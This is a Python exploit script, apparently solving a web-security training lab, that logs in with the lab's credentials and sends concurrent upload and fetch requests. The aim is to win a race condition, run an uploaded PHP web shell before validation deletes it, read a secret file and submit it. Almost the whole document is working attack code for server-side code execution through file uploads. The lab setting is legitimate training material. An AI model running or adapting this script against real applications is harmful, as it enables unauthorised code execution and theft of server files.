"""
    Lab: Web shell upload via race condition

    This lab contains a vulnerable image upload function. Although it performs robust validation on any files that are uploaded, it is possible to bypass this validation entirely by exploiting a race condition in the way it processes them.
    To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.
    You can log in to your own account using the following credentials: wiener:peter

    Exploit Steps:
    1. Log in to the application using the provided credentials.
    2. Upload a PHP web shell as your avatar.
    3. Exploit the race condition by sending concurrent GET requests to execute the uploaded file before it is deleted.
    4. Use the web shell to read the contents of the file /home/carlos/secret.
    5. Submit the contents of the secret file using the button provided in the lab banner.

    Author: N00BCYB0T
"""

import argparse
import re
from colorama import Fore
import requests
from urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

URL = None

def main():
    global URL

    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., https://target-lab.com)')
    parser.add_argument('--proxy', help='HTTP Proxy (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--file', required=True, help='Path to the PHP web shell file')
    parser.add_argument('--attempts', type=int, default=5, help='Number of attempts (default: 5)')
    parser.add_argument('--post-tries', type=int, default=10, help='Number of POST requests per attempt (default: 10)')
    parser.add_argument('--get-tries', type=int, default=10, help='Number of GET requests per attempt (default: 10)')
    args = parser.parse_args()

    URL = args.url.rstrip('/')
    session = requests.Session()
    if args.proxy:
        session.proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    session.verify = False

    print(f"{Fore.YELLOW}[*] Starting race condition attack...{Fore.RESET}")
    csrf_token = get_csrf(session, "/login")
    login_data = {
        "username": "wiener",
        "password": "peter",
        "csrf": csrf_token
    }
    r = session.post(f"{URL}/login", data=login_data, allow_redirects=True)
    if "Your username is: wiener" not in r.text:
        print(f"{Fore.RED}[-] Login failed{Fore.RESET}")
    else:
        print(f"{Fore.GREEN}[+] Logged in as wiener{Fore.RESET}")

    # Get file content and CSRF token for uploads
    csrf_token = get_csrf(session, "/my-account")
    with open(args.file, "rb") as f:
        file_content = f.read()
    filename = args.file.split("\\")[-1].split("/")[-1]

    print(f"{Fore.YELLOW}[*] Exploiting race condition...{Fore.RESET}")
    for attempt in range(args.attempts):
        print(f"{Fore.YELLOW}[*] Attempt {attempt + 1}/{args.attempts}{Fore.RESET}")
        with ThreadPoolExecutor(max_workers=20) as executor:
            # Submit POST and GET requests simultaneously for each attempt
            futures = []
            for _ in range(args.post_tries):
                futures.append(executor.submit(upload_shell_and_race, session, filename, file_content, csrf_token))
            for _ in range(args.get_tries):
                futures.append(executor.submit(fetch_secret, session, filename))
            
            # Wait for all futures to complete before starting next attempt
            for future in futures:
                try:
                    result = future.result()
                    if result:  # If we got a valid secret
                        submit_solution(session, result)
                        return
                except Exception as e:
                    continue  # Ignore any exceptions and continue with next request

    print(f"{Fore.RED}[-] Failed to retrieve the secret after {args.attempts} attempts{Fore.RESET}")

def fetch_secret(session, filename):
    try:
        r = session.get(f"{URL}/files/avatars/{filename}")
        secret = r.text.strip()
        if secret:
            return secret
    except Exception as e:
        print(f"{Fore.RED}[-] Error fetching secret: {e}{Fore.RESET}")
    return None

def upload_shell_and_race(session, filename, file_content, csrf_token):
    files = {
        "avatar": (filename, file_content, "image/jpeg")
    }
    data = {
        "csrf": csrf_token,
        "user": "wiener"
    }
    try:
        session.post(f"{URL}/my-account/avatar", files=files, data=data, allow_redirects=True)
    except Exception as e:
        # Just log the error and continue
        print(f"{Fore.RED}[-] Error in POST request: {e}{Fore.RESET}")


def submit_solution(session, secret):
    print(f"{Fore.YELLOW}[*] Submitting solution...{Fore.RESET}")
    session.post(f"{URL}/submitSolution", data={"answer": secret})
    solved = session.get(f"{URL}/")
    if "Congratulations, you solved the lab!" in solved.text:
        print(f"{Fore.GREEN}[+] Lab solved!{Fore.RESET}")
    else:
        print(f"{Fore.RED}[-] Failed to solve the lab{Fore.RESET}")

def get_csrf(session, page):
    r = session.get(f"{URL}{page}")
    m = re.search(r'csrf" value="(.+?)"', r.text)
    if not m:
        print(f"{Fore.RED}[-] CSRF token not found on {page}{Fore.RESET}")
        exit(1)
    return m.group(1)

if __name__ == "__main__":
    main()